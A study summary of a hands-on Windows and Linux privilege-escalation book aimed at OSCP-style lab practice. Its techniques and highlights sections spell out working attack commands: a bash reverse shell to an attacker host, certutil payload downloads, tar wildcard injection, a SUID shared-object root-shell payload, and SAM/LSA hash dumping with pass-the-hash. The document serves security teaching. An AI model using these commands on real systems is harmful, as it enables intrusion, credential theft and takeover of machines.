## One-liner

A hands-on, lab-driven cookbook by HackerSploit's Alexis Ahmed that walks an attacker from initial foothold to root/SYSTEM on both Windows and Linux through enumeration plus a fixed catalog of escalation vectors, each shown manually and automated with Metasploit.

## Thesis

Privilege escalation is the load-bearing post-exploitation phase that decides how far a pentest gets, and it is won not by exotic 0-days but by thorough local enumeration that surfaces misconfigurations the defender did not know existed. The book argues each OS has a distinct escalation surface rooted in its design philosophy (Windows access tokens / SAM / registry / services vs. Linux SUID / cron / shared objects / /etc/passwd), and teaches a repeatable pipeline: gain access, enumerate exhaustively, identify a vector, then exploit it both by hand and with Metasploit. It deliberately teaches manual technique alongside automation because automated suggesters fail (the netfilter exploit fails for a missing libc6-dev-i386) and trial-and-error is intrinsic to the craft.

## Core ideas

1. Horizontal vs. vertical escalation: horizontal moves sideways to a same-level account (e.g., John to Mike) to harvest data/hashes; vertical climbs to root/Administrator for total system control - the bigger payout attackers prefer.
2. The protection-ring model (ring 0 most privileged) underpins why OSes segregate privileged (root/admin) from unprivileged access, and escalation is the act of crossing that boundary via a vuln OR a misconfiguration.
3. Windows and Linux differ by design philosophy, and that dictates the escalation surface: Windows uses SID/RID identification, Winlogon/SAM/LSASS auth, access tokens, and the registry; Linux uses UID 0 = root, world-readable /etc/passwd, SUID bits, and cron.
4. Windows identity is read off the RID, not the username: Administrator=500, Guest=501, Domain Admin=512 - so `wmic useraccount get name,sid` lets you spot privileged accounts regardless of naming.
5. Access tokens are the heart of Windows escalation: a token (User/Group/Logon SID + privileges + DACL) is minted by Winlogon and inherited by child processes; impersonate-level tokens stay local while delegate-level tokens (from interactive/RDP logon) can be impersonated on any system and pose the biggest threat.
6. Three privileges make impersonation possible - SeImpersonatePrivilege, SeAssignPrimaryToken, SeCreateToken - and Potato attacks (Hot/Rotten) abuse the NTLM HTTP-to-SMB relay plus NBNS/WPAD spoofing to negotiate an NT AUTHORITY\SYSTEM token.
7. Password mining is escalation without an exploit: it leverages human failure (cleartext creds in .doc/.txt/.xlsx, password reuse, leftover Unattend.xml/Sysprep files) and is a 'straightforward access vector, without the need for further system exploitation.'
8. Windows hash storage is the weak link: SAM lives in the registry (HKLM\SAM), LM is breakable (split into two 7-char chunks, uppercased, 56-bit DES), NTLM uses MD4; dumped hashes can be cracked with John or simply replayed via pass-the-hash with psexec.
9. Services are 'the largest threat surface': unquoted service paths, weak SERVICE_ALL_ACCESS permissions, the MS16-032 secondary-logon handle bug, and DLL hijacking all let a low-priv user run a payload as SYSTEM.
10. The Windows registry is a centralized misconfiguration store: Autorun program replacement, AlwaysInstallElevated (1 = enabled) MSI installs as admin, and writable service ImagePath keys each yield SYSTEM.
11. Linux escalation clusters on SUID binaries (the s bit lets you run as the file owner, usually root), cron jobs running as root (vulnerable via $PATH, wildcards, or writable scripts), and locally stored credentials.
12. Automation is a starting point, not a guarantee: the book explicitly shows local_exploit_suggester's recommended netfilter exploit FAILING (missing libc6-dev-i386) and concludes 'you cannot always rely on using automated Metasploit modules... Trial and error is a big part of the privilege escalation process.'
13. Shared-object injection is the Linux analog of Windows DLL hijacking: when a root SUID binary loads a writable .so from a user-controlled path (libcalc.so in the home dir), you compile a malicious .so whose constructor spawns a root shell.
14. Enumeration is framed as a heist: 'If insufficient information regarding the target is obtained, the heist will be marred with mistakes' - comprehensive system/user/network/password/firewall enumeration is the determinant of escalation success.

## Techniques and methods

- Build an isolated lab: VirtualBox host-only adapter at 10.10.10.1/24 with DHCP, targets Win7 (MS Edge VM), Metasploitable3-win2k8, Metasploitable2, Win10, attacker Kali (root/toor), discover hosts with `netdiscover -i <if> -r 10.10.10.1/24`.
- Footprint-to-exploit pipeline: `nmap -sS -A -T4 -p- <IP> -oX out.xml` then `db_import out.xml` into msfconsole, confirm vuln with auxiliary/scanner/smb/smb_ms17_010, exploit with ms17_010_eternalblue, set persistence.
- Windows enumeration one-liners: `systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`, `wmic qfe` for hotfixes, `whoami /priv` and `/groups`, `net localgroup administrators`, `netstat -ano`, `sc query windefend`.
- Manual Windows kernel exploit: enumerate with winPEAS or Windows-Exploit-Suggester (needs Python2 + python-xlrd), compile with `i686-w64-mingw32-gcc exploit.c -o exploit.exe` (add -lws2_32 for 32-bit), transfer via `python -m SimpleHTTPServer 80` + `certutil -urlcache -f http://KALI/exploit.exe exploit.exe`, run and migrate to winlogon.exe.
- Token impersonation: enumerate with `getprivs`/`whoami /priv` for SeImpersonatePrivilege, run ms16_075_reflection, then `load incognito` -> `list_tokens -u` -> `impersonate_token "NT AUTHORITY\SYSTEM"`; manual path uses rottenpotato.exe.
- Windows password mining: `findstr /si password *.txt *.xml`, `dir /s *pass* == *cred* == *vnc* == *.config*`, `reg query HKLM /f password /t REG_SZ /s`, read Unattend.xml AutoLogon Base64 password and `echo '...' | base64 -d`, read wp-config.php then `mysql -u root -p -h <ip>` and dump wp_users.
- Hash dump and crack: `reg save hklm\sam c:\sam` then SamDump2/PwDump7, or meterpreter `hashdump`, `load kiwi` + `lsa_dump_sam`, mimikatz `token::elevate`; crack with `sudo john --format=NT hashes.txt`; replay with exploit/windows/smb/psexec setting SMBPass to the hash.
- Service exploitation: find unquoted paths with `wmic service get name,displayname,pathname,startmode | findstr /i /v "c:\" | findstr /i /v """`, check dir ACLs with `icacls`, drop an msfvenom exe named cygrunsrv.exe; weak perms via `accesschk64.exe -uwcqv vagrant *` then `sc config OpenSSHd binPath= "net localgroup administrators vagrant /add"` and restart the service.
- DLL hijacking: run lpe_windows_setup.bat to create dllsvc, find missing DLLs with `winPEASx64.exe servicesinfo` or Process Monitor filtered on NAME NOT FOUND + .dll, build `msfvenom ... -f dll > hijackme.dll`, drop it in the search path (C:\Windows\System32\wbem), restart dllsvc, catch a SYSTEM meterpreter on multi/handler.
- Registry escalation: replace an Autorun exe with an msfvenom payload of the same name; check `reg query HK..\Installer /v AlwaysInstallElevated` (1=on) then `msiexec /quiet /qn /i C:/temp/setup.msi`; rewrite a weak service key with `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /t REG_EXPAND_SZ /v ImagePath /d "C:\Temp\shell.exe" /f` and `sc start regsvc`.
- Linux kernel exploit: enumerate version with linPEAS `-o SysI` (uname/distro), find exploits with `./les.sh` or `searchsploit linux kernel 4.4`, download exploit 39772.zip, `unzip` then `tar xf exploit.tar`, `./compile.sh`, run `./doubleput` (CVE-2016-4557) for root.
- Linux credential mining: `gdb -p <bash PID>` then `info proc mappings`, `dump memory out <heap-start> <heap-end>`, `strings out | grep passw` to recover a cleartext MySQL root password, then reuse it via `ssh root@<ip>` or `su root`; also `grep -rnw '/' -ie 'PASSWORD'` and `cat ~/.bash_history | grep pass` / `history`.
- Cron escalation: enumerate with linPEAS and `cat /etc/crontab`; PATH abuse - drop `echo 'bash -i >& /dev/tcp/KALI/PORT 0>&1' > overwrite.sh` in the home dir the cron PATH points at; wildcard abuse - `touch '/home/user/--checkpoint=1'` and `touch '/home/user/--checkpoint-action=exec=sh shell.sh'` against a `tar ... *` job; file overwrite - append the reverse shell to a writable cron script; catch with `nc -nvlp PORT`.
- SUID exploitation: `find / -type f -perm -u=s -ls 2>/dev/null`, cross-check against GTFOBins; shared-object injection - `mkdir ~/.config`, write libcalc.c whose `__attribute__((constructor))` runs `cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p`, compile `gcc -shared -o ~/.config/libcalc.so -fPIC ~/.config/libcalc.c`, run the suid-so binary, confirm with `id`.

## Memorable

- The libcalc.c shared-object injection payload printed verbatim in the front matter and Chapter 13: `static void inject() __attribute__((constructor)); void inject() { system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p"); }` - the book's signature one-liner-as-code.
- Windows holds ~93% of the PC market share, which is why the book argues defenders mostly run Windows endpoints but Linux for critical infrastructure (mail, DB, web, IDS), making Linux compromises more disruptive.
- RID cheat sheet for spotting privileged accounts regardless of username: Administrator=500, Guest=501, Domain administrator=512, Domain computer=515.
- The honest automation-failure lesson: the netfilter_priv_esc_ipv4 module fails because libc6-dev-i386 is not installed, and the author states you 'cannot always rely on using automated Metasploit modules... Trial and error is a big part of the privilege escalation process.'
- LM hashing exposed step by step: password split into two 7-character chunks, all chars uppercased, each chunk DES-encrypted with a weak 56-bit key, max 14-char passwords - i.e., trivially crackable.
- The Base64 AutoLogon password in a leftover Unattend.xml (`<Password>UGFzc3dvcmQxMjM=</Password>`) decoding to a cleartext admin password via `base64 -d` - leftover deployment files handing over the box.
- The cron wildcard exploit weaponizes a benign-looking feature: GNU tar's `--checkpoint`/`--checkpoint-action` turned into code execution by creating files literally named `--checkpoint=1` and `--checkpoint-action=exec=sh shell.sh` in a directory a root tar `*` job runs over.
- The enumeration-as-heist analogy: 'If insufficient information regarding the target is obtained, the heist will be marred with mistakes and will, in all probability, end up failing.'
- Delegate-level tokens (from interactive/RDP logon) 'pose the largest threat as they can be used to impersonate tokens on any system' - the conceptual core of why Potato attacks matter.
- GDB heap-dump credential recovery: dumping a running bash process's heap and running `strings | grep passw` recovers a full MySQL root authentication command in cleartext, which then logs into root over SSH purely because the admin reused the password.
- The two canonical demo footholds: EternalBlue (MS17-010, SMBv1) against Metasploitable3-win2k8 and Samba 3.0.20 usermap_script against Metasploitable2.
- GTFOBins (gtfobins.github.io) introduced as the curated lookup of Unix binaries abusable to bypass local security restrictions - the reference every SUID hunt now starts with.

## Curriculum fit

This is an entry-to-intermediate OSCP-prep practical, not a theory text - it maps almost 1:1 onto the local-priv-esc portion of the PWK/OSCP syllabus and the HackerSploit lab tradition (the author founded HackerSploit). Use it as the hands-on companion right after a general pentest primer and immediately before tackling HackTheBox/TryHackMe/VulnHub boxes; the very Stapler and lpeworkshop targets it uses are HTB/VulnHub staples. It pairs naturally with Tib3rius's Windows/Linux Privilege Escalation courses, the lpeworkshop by Sagi Shahar, and the two GTFOBins-style live references (GTFOBins for Linux, and an equivalent LOLBAS mindset for Windows) which the book points you to but does not replace. For depth it should be supplemented: it is light on Active Directory escalation (Kerberos/BloodHound), on modern Windows mitigations (UAC internals beyond bypassuac_eventvwr, Credential Guard, AMSI/EDR evasion), and several techniques are dated (Python2 tools, LM hashing focus, RottenPotato vs. modern JuicyPotato/PrintSpoofer/GodPotato). Read it for the repeatable enumerate-then-exploit muscle memory and the manual-vs-automated discipline; follow with current potato variants, AD escalation material, and a CTF grind to operationalize it. Its lasting value in a self-study track is the mental checklist: foothold -> exhaustive local enumeration -> match a vector from a known catalog -> exploit by hand first, automation second.
